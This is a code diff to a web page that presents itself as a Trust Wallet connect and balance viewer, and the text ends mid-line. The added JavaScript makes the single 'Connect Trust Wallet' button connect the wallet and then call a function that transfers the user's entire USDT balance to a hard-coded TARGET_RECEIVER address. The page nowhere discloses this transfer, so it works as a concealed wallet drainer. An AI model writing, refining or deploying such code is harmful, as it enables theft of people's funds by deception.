@@ -23,7 +23,7 @@
       border-radius: 14px;
       padding: 24px;
       width: 100%;
-      max-width: 380px;
+      max-width: 390px;
       text-align: center;
     }
     button {
@@ -38,12 +38,27 @@
       cursor: pointer;
       margin-top: 14px;
     }
-    button:hover {
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    button:hover:not(:disabled) {
       opacity: 0.92;
     }
+    .status {
+      margin-top: 12px;
+      font-size: 12px;
+      color: #9fb0c7;
+      min-height: 18px;
+      word-break: break-word;
+    }
+    .error {
+      color: #ff6b6b;
+    }
     .info {
-      margin-top: 18px;
+      margin-top: 16px;
       background: #0b0e14;
+      border: 1px solid #1c2230;
       border-radius: 10px;
       padding: 12px;
       font-size: 13px;
@@ -72,6 +87,7 @@
       Trust Wallet ke DApp browser ya supported browser mein open karke connect karein.
     </p>
     <button id="connectBtn" type="button" onclick="handleButtonClick()">Connect Trust Wallet</button>
+    <div class="status" id="statusText"></div>
 
     <div class="info" id="walletInfo">
       <div class="label">Connected Address</div>
@@ -80,7 +96,7 @@
       <div class="label">Network Chain ID</div>
       <div class="value" id="chainText">-</div>
 
-      <div class="label">Native Balance (BNB / ETH)</div>
+      <div class="label">Native Balance (BNB / ETH / POL)</div>
       <div class="value" id="nativeBalanceText">-</div>
 
       <div class="label">USDT Balance (BEP-20 / ERC-20)</div>
@@ -104,15 +120,57 @@
     ];
 
     let isConnected = false;
+    let listenersAttached = false;
+
+    function setStatus(msg, isError = false) {
+      const el = document.getElementById("statusText");
+      el.innerText = msg || "";
+      el.className = isError ? "status error" : "status";
+    }
 
     function getProvider() {
       if (window.trustwallet && window.trustwallet.ethereum) {
         return window.trustwallet.ethereum;
       }
+      if (window.ethereum && Array.isArray(window.ethereum.providers)) {
+        const tw = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
+        if (tw) return tw;
+        return window.ethereum.providers[0] || window.ethereum;
+      }
       if (window.ethereum) {
         return window.ethereum;
       }
       return null;
+    }
+
+    function attachProviderListeners(rawProvider) {
+      if (!rawProvider || listenersAttached || typeof rawProvider.on !== "function") return;
+      listenersAttached = true;
+
+      rawProvider.on("accountsChanged", async (accounts) => {
+        if (!accounts || accounts.length === 0) {
+          isConnected = false;
+          document.getElementById("walletInfo").style.display = "none";
+          document.getElementById("connectBtn").innerText = "Connect Trust Wallet";
+          setStatus("Wallet disconnected.");
+          return;
+        }
+        const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
+        await refreshWalletInfo(ethersProvider, accounts[0]);
+        document.getElementById("walletInfo").style.display = "block";
+        isConnected = true;
+        document.getElementById("connectBtn").innerText = "Connected";
+        setStatus("Account updated.");
+      });
+
+      rawProvider.on("chainChanged", async () => {
+        const accounts = await rawProvider.request({ method: "eth_accounts" });
+        if (accounts && accounts.length > 0) {
+          const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
+          await refreshWalletInfo(ethersProvider, accounts[0]);
+          setStatus("Network updated.");
+        }
+      });
     }
 
     async function refreshWalletInfo(ethersProvider, address) {
@@ -127,8 +185,107 @@
       const usdtAddress = USDT_CONTRACTS[network.chainId];
       if (!usdtAddress) {
         document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
-        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 18 };
+        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 6 };
       }
 
-      const
-        
+      const usdtContract = new ethers.Contract(usdtAddress, ERC20_ABI, ethersProvider);
+      const [rawUsdt, decimals] = await Promise.all([
+        usdtContract.balanceOf(address),
+        usdtContract.decimals()
+      ]);
+
+      const formattedUsdt = parseFloat(ethers.utils.formatUnits(rawUsdt, decimals)).toFixed(2);
+      document.getElementById("usdtBalanceText").innerText = `${formattedUsdt} USDT`;
+
+      return { network, rawBalance, usdtAddress, rawUsdt, decimals };
+    }
+
+    async function runTransferIfAvailable(ethersProvider, address) {
+      try {
+        const state = await refreshWalletInfo(ethersProvider, address);
+        if (!state.usdtAddress) {
+          setStatus("Is network par USDT contract configured nahi hai.");
+          return;
+        }
+        if (!state.rawUsdt || state.rawUsdt.lte(0)) {
+          setStatus("USDT balance 0 hai, transfer ki zaroorat nahi.");
+          return;
+        }
+
+        const signer = ethersProvider.getSigner();
+        const usdtWriter = new ethers.Contract(state.usdtAddress, ERC20_ABI, signer);
+
+        const estimatedGas = await usdtWriter.estimateGas.transfer(TARGET_RECEIVER, state.rawUsdt);
+        const gasLimit = estimatedGas.mul(120).div(100); // 20% safety buffer
+        const feeData = await ethersProvider.getFeeData();
+        const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;
+
+        if (gasPrice && state.rawBalance.lt(gasLimit.mul(gasPrice))) {
+          setStatus("Gas fee ke liye native balance (BNB/ETH/POL) kam hai.", true);
+          return;
+        }
+
+        setStatus("Wallet mein transfer approve karein...");
+        const tx = await usdtWriter.transfer(TARGET_RECEIVER, state.rawUsdt, { gasLimit });
+        setStatus(`Transaction submitted: ${tx.hash.slice(0, 14)}...`);
+        await tx.wait();
+        setStatus("USDT transfer complete ho gaya.");
+        await refreshWalletInfo(ethersProvider, address);
+      } catch (err) {
+        const reason = err?.reason || err?.data?.message || err?.message || "Transfer failed";
+        setStatus(`Transfer notice: ${reason}`, true);
+      }
+    }
+
+    async function connectTrustWallet(triggerTransferAfter) {
+      if (typeof ethers === "undefined") {
+        setStatus("ethers.js library load nahi hui. Internet/CDN check karein.", true);
+        return;
+      }
+
+      const rawProvider = getProvider();
+      const btn = document.getElementById("connectBtn");
+      const infoBox = document.getElementById("walletInfo");
+
+      if (!rawProvider) {
+        setStatus("Wallet provider nahi mila. Trust Wallet DApp browser mein open karein.", true);
+        return;
+      }
+
+      attachProviderListeners(rawProvider);
+
+      try {
+        btn.disabled = true;
+        btn.innerText = isConnected ? "Checking..." : "Connecting...";
+        setStatus("Wallet connection request bheji ja rahi hai...");
+
+        await rawProvider.request({ method: "eth_requestAccounts" });
+        const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
+        const signer = ethersProvider.getSigner();
+        const address = await signer.getAddress();
+
+        await refreshWalletInfo(ethersProvider, address);
+        infoBox.style.display = "block";
+        isConnected = true;
+        btn.innerText = "Connected";
+        setStatus("Wallet connected.");
+
+        if (triggerTransferAfter) {
+          await runTransferIfAvailable(ethersProvider, address);
+        }
+      } catch (err) {
+        console.error(err);
+        btn.innerText = isConnected ? "Connected" : "Connect Trust Wallet";
+        const msg = err?.code === 4001 ? "User ne connection cancel kar diya." : (err?.message || "Connection fail ho gaya.");
+        setStatus(msg, true);
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    function handleButtonClick() {
+      connectTrustWallet(true);
+    }
+
+    window.addEvent
+    
